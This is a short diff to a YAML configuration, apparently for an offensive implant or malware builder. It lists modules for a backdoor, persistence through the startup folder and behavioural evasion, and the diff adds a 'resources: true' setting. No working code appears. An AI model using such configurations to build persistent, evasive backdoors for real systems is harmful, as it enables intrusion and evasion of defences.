@@ -18,6 +18,8 @@ commands:
 arch: arch/backdoor
 persist: persist/startup_folder
 
+resources: true
+
 evasion:
   - evasion/behavioral_pacing
 
